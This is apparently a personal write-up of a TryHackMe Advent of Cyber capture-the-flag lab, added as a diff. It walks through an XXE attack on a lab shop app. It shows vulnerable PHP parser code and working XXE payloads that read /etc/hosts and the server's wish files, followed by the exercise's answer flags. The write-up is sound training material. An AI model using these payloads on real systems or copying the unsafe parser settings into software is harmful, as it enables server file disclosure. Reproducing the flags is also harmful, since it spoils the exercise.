@@ -333,3 +333,217 @@ Ans: *THM{GlitchTestingForSpearphishing}*
 
 *THM{R2xpdGNoIGlzIG5vdCB0aGUgZW5lbXk=}*
 
+
+# **Day 5: SOC-mas XX-what-ee?**
+
+**Practical** 
+
+Now that you understand the basic concepts related to XML and XXE, we will analyse an application that allows users to view and add products to their carts and perform the checkout activity.
+
+You can access the Wareville application hosted on `http://10.10.99.49`. This application allows users to request their Christmas wishes.
+
+**Flow of the Application**
+
+As a penetration tester, it is important to first analyse the flow of the application.
+
+First, the user will browse through the products and add items of interest to their wishlist at `http://MACHINE_IP/product.php`.
+
+Click on the `Add to Wishlist` under `Wareville's Jolly Cap`, as shown below:
+
+![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/45.png)
+
+After adding products to the wishlist, click the `Cart` button or visit `http://MACHINE_IP/cart.php` to see the products added to the cart.
+
+On the `Cart` page, click the `Proceed to Checkout` button to buy the items as shown below:
+
+![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/46.png)
+
+On the checkout page, the user will be prompted to enter his name and address as shown below:
+
+![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/47.png)
+
+Once you complete the wish, you will be shown the message **"Wish successful. Your wish has been saved as Wish #21"**, as shown below:
+
+![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/48.png)
+
+**Wish #21** indicates the wishes placed by a user on the website. Once you click on **Wish #21**, you will see a forbidden page because the details are only accessible to **admins**.
+But can we try to bypass this and access other people's wishes? This is what we will try to perform in this task.
+
+![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/49.png)
+
+**Intercepting the Request**
+
+let's open our burpsuite, and intercept the target page and see..
+
+I turned on the intercept and I accessed the home page and let's see what is in there?
+
+nothing we need to do some actions to look at what's happening in the backend..
+
+What is Happening in the Backend?
+
+Now, when you visit the URL, `http://MACHINE_IP/product.php`, and click Add to Wishlist,
+
+an AJAX call is made to wishlist.php with the following XML as input. 
+
+```XML
+<wishlist>
+  <user_id>1</user_id>
+     <item>
+       <product_id>1</product_id>
+     </item>
+</wishlist>
+```
+
+let's check the `/wishlist.php` now..
+
+![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/50.png)
+
+will look like this..
+
+![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/51.png)
+
+In the above XML, `<product_id>` tag contains the ID of the product, which is `1` in this case.
+
+Now, let's review the `Add to Wishlist` request logged in `Burp Suite's HTTP History` option under the `proxy` tab.
+
+As discussed above, the request contains XML being forwarded as a **POST** request.
+
+This `wishlist.php` accepts the request and parses the request using the following code:
+
+```php
+<?php
+..
+...
+libxml_disable_entity_loader(false);
+$wishlist = simplexml_load_string($xml_data, "SimpleXMLElement", LIBXML_NOENT);
+
+...
+..
+echo "Item added to your wishlist successfully.";
+?>
+```
+
+**Preparing the Payload**
+
+When a user sends specially crafted XML data to the application, the line `libxml_disable_entity_loader(false)` allows the XML parser to load external entities.
+
+This means the XML input can include external file references or requests to remote servers.
+
+When the XML is processed by `simplexml_load_string` with the `LIBXML_NOENT` option, the web app resolves external entities, allowing attackers access to sensitive files or allowing them to make unintended requests from the server.
+
+What if we update the XML request to include references for external entities? We will use the following XML instead of the above XML:
+
+```XML 
+<!--?xml version="1.0" ?-->
+<!DOCTYPE foo [<!ENTITY payload SYSTEM "/etc/hosts"> ]>
+<wishlist>
+  <user_id>1</user_id>
+     <item>
+       <product_id>&payload;</product_id>
+     </item>
+</wishlist>
+```
+
+When we send this updated XML payload, the first two lines introduce an external entity called payload.
+
+ The line **<!ENTITY payload SYSTEM "/etc/hosts">** tells the XML parser to replace the **& payload**; reference with the contents of the file `/etc/hosts` on the server.
+
+When the XML is processed, instead of a normal `product_id`, the application will try to load and include the contents of the file specified in the entity `(/etc/hosts)`.
+
+**Exploitation**
+
+Now, let's perform the exploitation by repeating the request we captured earlier using repeater, right click on `wishlist.php` from the http history in the proxy option..
+
+![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/53.png)
+
+let's change the `<wishlist>` `</wishlist>` section code to our crafted one..
+
+let's click on `send` from the top left corner repeater's interface and see the resposne..!
+
+![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/54.png)
+
+When we clicked `Send`, the server processed the malicious XML payload, which included the external entity reference to `/etc/hosts`.
+
+As a result, the `wishlist.php` responded with the contents of the `/etc/hosts` file, leading to an **XXE vulnerability**.
+
+**Time for Some Action**
+
+You've identified a vulnerability in the `wishlist.php` endpoint of McSkidy Software's application.
+
+Now, the goal is to exploit this flaw to assess its impact. Specifically, you aim to access sensitive information, such as the townspeople's wishes stored in files, by targeting an admin-only page `(/wishes/wish_1.txt)`.
+
+By assuming the application is hosted on `/var/www/html`, the plan involves crafting a payload to read these files and demonstrate the severity of the vulnerability to help secure the platform.
+
+**Note: Not all web applications use the path /var/www/html, but web servers typically use it.**
+
+```xml
+<!--?xml version="1.0" ?-->
+<!DOCTYPE foo [<!ENTITY payload SYSTEM "/var/www/html/wishes/wish_1.txt"> ]>
+<wishlist>
+	<user_id>1</user_id>
+	<item>
+	       <product_id>&payload;</product_id>
+	</item>
+</wishlist>
+```
+
+![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/55.png)
+
+Surprisingly, we got lucky that our assumption worked.
+
+The next thing to do is see whether we can view more wishes using our discovery. To do this, let's try replacing the `wish_1.txt` with `wish_2.txt`.
+
+![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/56.png)
+
+By incrementing the number in the file path `(/wishes/wish_1.txt)`, you successfully accessed the next wish, confirming that the wishes are stored sequentially. 
+
+Repeating this process allows viewing all the wishes in the application.
+
+This demonstrates the vulnerability's impact: an attacker could exploit it to access sensitive data, such as all the wishes submitted by the townspeople of Wareville.
+
+*After discovering the vulnerability, McSkidy immediately remembered that a CHANGELOG file exists within the web application, stored at the following endpoint: `http://10.10.99.49/CHANGELOG`. After checking, it can be seen that someone pushed the vulnerable code within the application after Software's team.*
+
+![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/57.png)
+
+
+With this discovery, McSkidy still couldn't confirm whether the Mayor intentionally made the application vulnerable. However, the Mayor had already become suspicious, and McSkidy began to formulate theories about his possible involvement.
+
+![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/58.png)
+
+
+**What is the flag discovered after navigating through the wishes?**
+
+*Question Hint: There are a lot of townspeople who submitted their wishes, so try iterating up to `20`.*
+
+![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/59.png)
+
+*THM{Brut3f0rc1n6_mY_w4y}*
+
+**What is the flag seen on the possible proof of sabotage?**
+
+*THM{m4y0r_m4lw4r3_b4ckd00rs}*
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
